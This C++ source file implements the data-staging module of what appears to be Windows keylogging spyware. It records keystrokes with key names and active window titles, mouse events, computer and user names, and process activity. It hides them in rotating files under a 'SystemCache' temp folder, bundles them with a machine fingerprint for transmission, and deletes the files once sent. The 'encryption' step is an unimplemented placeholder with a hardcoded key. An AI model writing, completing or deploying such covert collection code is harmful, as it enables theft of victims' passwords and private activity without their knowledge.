#include "data/DataManager.h"
#include "core/Logger.h"
#include "utils/SystemUtils.h"
#include <algorithm>
#include <sstream>
#include <chrono>   
#include <iomanip>
#include <vector>
#include <cstdint>
#include <string>
#include <ctime>
#include <windows.h>
#include <fileapi.h>
#include <sys/stat.h>

// Forward declaration for Configuration if not available
class Configuration {
public:
    static size_t GetMaxFileSize() { return 10 * 1024 * 1024; } // 10MB default
    [[nodiscard]] static std::string GetEncryptionKey() { return "default-encryption-key"; }
};

DataManager::DataManager(Configuration* config)
    : m_config(config), m_maxBufferSize(Configuration::GetMaxFileSize()) {
    InitializeStorage();
}

DataManager::~DataManager() {
    FlushAllData();
}

void DataManager::InitializeStorage() {
    m_storagePath = "C:\\Temp\\SystemCache\\";
    
    // Create directory if it doesn't exist
    CreateDirectoryA(m_storagePath.c_str(), NULL);
    
    // Create initial data file
    auto now = std::chrono::system_clock::now();
    auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(
        now.time_since_epoch()).count();
    std::string filename = "data_" + std::to_string(timestamp) + ".bin";
    m_currentDataFile = m_storagePath + filename;
    
    LOG_INFO("Data storage initialized at: " + m_storagePath);
}

void DataManager::AddKeyData(const KeyData& keyData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Convert to string representation
    std::string dataStr = KeyDataToString(keyData);
    m_keyDataBuffer += dataStr;
    
    // Check if buffer needs flushing
    if (m_keyDataBuffer.size() >= m_maxBufferSize / 4) {
        FlushKeyData();
    }
}

void DataManager::AddMouseData(const MouseData& mouseData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = MouseDataToString(mouseData);
    m_mouseDataBuffer += dataStr;
    
    if (m_mouseDataBuffer.size() >= m_maxBufferSize / 8) {
        FlushMouseData();
    }
}

void DataManager::AddSystemData(const utils::SystemInfo& systemInfo) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = SystemInfoToString(systemInfo);
    m_systemDataBuffer += dataStr;  
    
    if (m_systemDataBuffer.size() >= m_maxBufferSize / 8) {
        FlushSystemData();
    }
}

void DataManager::AddSystemEventData(const SystemEventData& eventData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = SystemEventToString(eventData);
    m_systemEventBuffer += dataStr;
    
    if (m_systemEventBuffer.size() >= m_maxBufferSize / 16) {
        FlushSystemEvents();
    }
}

std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    FlushAllData();
    
    // Get all data files that are ready for transmission
    std::vector<std::string> dataFiles = GetDataFilesReadyForTransmission();
    std::vector<uint8_t> allData;
    
    for (const auto& file : dataFiles) {
        // Read file data
        if (FILE* f = fopen(file.c_str(), "rb")) {
            fseek(f, 0, SEEK_END);
            long size = ftell(f);
            fseek(f, 0, SEEK_SET);
            
            std::vector<uint8_t> fileData(size);
            if (fread(fileData.data(), 1, size, f) == size) {
                // Add file delimiter with metadata
                std::string delimiter = "FILE_DELIMITER:";
                size_t lastSlash = file.find_last_of("/\\");
                if (lastSlash != std::string::npos) {
                    delimiter += file.substr(lastSlash + 1);
                } else {
                    delimiter += file;
                }
                delimiter += ":SIZE:" + std::to_string(fileData.size()) + "\n";
                
                allData.insert(allData.end(), 
                              delimiter.begin(), delimiter.end());
                
                // Add file data
                allData.insert(allData.end(), fileData.begin(), fileData.end());
                
                // Mark file as transmitted
                MarkFileAsTransmitted(file);
            }
            fclose(f);
        }
    }
    
    if (allData.empty()) {
        return {};
    }
    
    // Add metadata header
    std::string metadata = "METADATA_START\n";
    metadata += "client_id:system_fingerprint\n"; // Simplified
    auto now = std::chrono::system_clock::now();
    auto timestamp = std::chrono::duration_cast<std::chrono::seconds>(
        now.time_since_epoch()).count();
    metadata += "timestamp:" + std::to_string(timestamp) + "\n";
    metadata += "total_size:" + std::to_string(allData.size()) + "\n";
    metadata += "file_count:" + std::to_string(dataFiles.size()) + "\n";
    metadata += "METADATA_END\n";
    
    std::vector<uint8_t> finalData(metadata.begin(), metadata.end());
    finalData.insert(finalData.end(), allData.begin(), allData.end());
    
    // Encrypt all data (simplified)
    std::string encryptionKey = Configuration::GetEncryptionKey();
    // In a real implementation, you would call your encryption library here
    std::vector<uint8_t> encryptedData = finalData; // Placeholder
    
    return encryptedData;
}

void DataManager::ClearData() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Delete all transmitted files
    std::vector<std::string> allFiles;
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((m_storagePath + "*.transmitted").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                allFiles.push_back(m_storagePath + findData.cFileName);
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
    
    for (const auto& file : allFiles) {
        DeleteFileA(file.c_str());
    }
}

bool DataManager::HasData() const {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Check if any files are ready for transmission
    auto dataFiles = GetDataFilesReadyForTransmission();
    return !dataFiles.empty() || 
           !m_keyDataBuffer.empty() || 
           !m_mouseDataBuffer.empty() ||
           !m_systemDataBuffer.empty() ||
           !m_systemEventBuffer.empty();
}

void DataManager::FlushAllData() {
    FlushKeyData();
    FlushMouseData();
    FlushSystemData();
    FlushSystemEvents();
}

void DataManager::FlushKeyData() {
    if (!m_keyDataBuffer.empty()) {
        AppendToFile(m_currentDataFile, m_keyDataBuffer);
        m_keyDataBuffer.clear();
        RotateDataFileIfNeeded();
    }
}

void DataManager::FlushMouseData() {
    if (!m_mouseDataBuffer.empty()) {
        AppendToFile(m_currentDataFile, m_mouseDataBuffer);
        m_mouseDataBuffer.clear();
        RotateDataFileIfNeeded();
    }
}

void DataManager::FlushSystemData() {
    if (!m_systemDataBuffer.empty()) {
        AppendToFile(m_currentDataFile, m_systemDataBuffer);
        m_systemDataBuffer.clear();
        RotateDataFileIfNeeded();
    }
}

void DataManager::FlushSystemEvents() {
    if (!m_systemEventBuffer.empty()) {
        AppendToFile(m_currentDataFile, m_systemEventBuffer);
        m_systemEventBuffer.clear();
        RotateDataFileIfNeeded();
    }
}

void DataManager::AppendToFile(const std::string& path, const std::string& data) {
    if (FILE* f = fopen(path.c_str(), "ab")) {
        fwrite(data.c_str(), 1, data.size(), f);
        fclose(f);
    }
    
    // Check file size and rotate if needed
    if (FILE* fcheck = fopen(path.c_str(), "rb")) {
        fseek(fcheck, 0, SEEK_END);
        long size = ftell(fcheck);
        fclose(fcheck);
        
        if (static_cast<size_t>(size) > m_maxBufferSize) {
            RotateDataFile();
        }
    }
}

void DataManager::RotateDataFileIfNeeded() {
    static std::chrono::steady_clock::time_point lastRotation = 
        std::chrono::steady_clock::now();
    
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(now - lastRotation);
    
    if (elapsed.count() >= 5) { // 5 minutes
        RotateDataFile();
        lastRotation = now;
    }
}

void DataManager::RotateDataFile() {
    // Close current file and create new one
    auto now = std::chrono::system_clock::now();
    auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(
        now.time_since_epoch()).count();
    std::string filename = "data_" + std::to_string(timestamp) + ".bin";
    m_currentDataFile = m_storagePath + filename;
    
    LOG_DEBUG("Rotated data file to: " + m_currentDataFile);
}

std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() const {
    std::vector<std::string> files;
    
    // List all .bin files
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((m_storagePath + "*.bin").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string file = m_storagePath + findData.cFileName;
                files.push_back(file);
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
    
    // Filter files
    std::vector<std::string> filteredFiles;
    for (const auto& file : files) {
        if (file != m_currentDataFile && 
            file.find(".transmitted") == std::string::npos) {
            
            // Check file modification time
            struct stat fileInfo{};
            if (stat(file.c_str(), &fileInfo) == 0) {
                auto currentTime = std::chrono::system_clock::now();
                auto modTime = std::chrono::system_clock::from_time_t(fileInfo.st_mtime);
                auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(
                    currentTime - modTime);
                
                if (elapsed.count() >= 1) { // 1 minute
                    filteredFiles.push_back(file);
                }
            }
        }
    }
    
    return filteredFiles;
}

void DataManager::MarkFileAsTransmitted(const std::string& filePath) {
    std::string newPath = filePath + ".transmitted";
    rename(filePath.c_str(), newPath.c_str());
    
    ScheduleFileDeletion(newPath, 24 * 60 * 60 * 1000);
}

void DataManager::ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs) {
    LOG_DEBUG("Scheduled file for deletion: " + filePath + 
             " in " + std::to_string(delayMs) + "ms");
}

std::string DataManager::KeyDataToString(const KeyData& data) {
    std::stringstream ss;
    ss << "KEY|" << data.timestamp << "|"
       << static_cast<int>(data.eventType) << "|"
       << data.keyCode << "|" << data.scanCode << "|"
       << static_cast<int>(data.modifiers) << "|"
       << data.windowTitle << "|" << data.keyName << "\n";
    return ss.str();
}

std::string DataManager::MouseDataToString(const MouseData& data) {
    std::stringstream ss;
    ss << "MOUSE|" << data.timestamp << "|"
       << static_cast<int>(data.eventType) << "|"
       << static_cast<int>(data.button) << "|"
       << data.position.x << "|" << data.position.y << "|"
       << data.wheelDelta << "|" << data.windowTitle << "\n";
    return ss.str();
}

std::string DataManager::SystemInfoToString(const utils::SystemInfo& info) {
    std::stringstream ss;
    ss << "SYSINFO|" << info.timestamp << "|"
       << info.computerName << "|" << info.userName << "|"
       << info.osVersion << "|" << info.memorySize << "|"
       << info.processorInfo << "\n";
    return ss.str();
}

std::string DataManager::SystemEventToString(const SystemEventData& event) {
    std::stringstream ss;
    ss << "SYSEVENT|" << event.timestamp << "|"
       << static_cast<int>(event.eventType) << "|"
       << event.windowHandle << "|"
       << event.windowTitle << "|" << event.processName << "|"
       << event.extraInfo << "\n";
    return ss.str();
}

// ==================== Batch Collection ====================

void DataManager::StartBatchCollection() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    m_batchStartTime = std::chrono::steady_clock::now();
    m_batchData.clear();
    LOG_DEBUG("Started new data collection batch");
}

bool DataManager::IsBatchReady() const {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(
        now - m_batchStartTime);
    return elapsed.count() >= 5; // 5 minutes
}

std::vector<uint8_t> DataManager::GetBatchData() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Combine all collected data
    std::string batchData;
    batchData += "BATCH_START\n";
    batchData += "batch_id:" + GenerateBatchId() + "\n";
    auto startTime = std::chrono::duration_cast<std::chrono::seconds>(
        m_batchStartTime.time_since_epoch()).count();
    batchData += "start_time:" + std::to_string(startTime) + "\n";
    auto endTime = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::steady_clock::now().time_since_epoch()).count();
    batchData += "end_time:" + std::to_string(endTime) + "\n";
    
    // Add all collected data
    batchData += m_keyDataBuffer;
    batchData += m_mouseDataBuffer;
    batchData += m_systemDataBuffer;
    batchData += m_systemEventBuffer;
    
    batchData += "BATCH_END\n";
    
    // Clear buffers for next batch
    m_keyDataBuffer.clear();
    m_mouseDataBuffer.clear();
    m_systemDataBuffer.clear();
    m_systemEventBuffer.clear();
    
    // Encrypt the batch data (placeholder)
    std::vector<uint8_t> encryptedData(batchData.begin(), batchData.end());
    
    return encryptedData;
}

std::string DataManager::GenerateBatchId() {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    char timeStr[20];
    if (std::tm* localTime = std::localtime(&time)) {
        strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", localTime);
        ss << timeStr << "_system_fingerprint";
    } else {
        ss << "unknown_system_fingerprint";
    }
    return ss.str();
}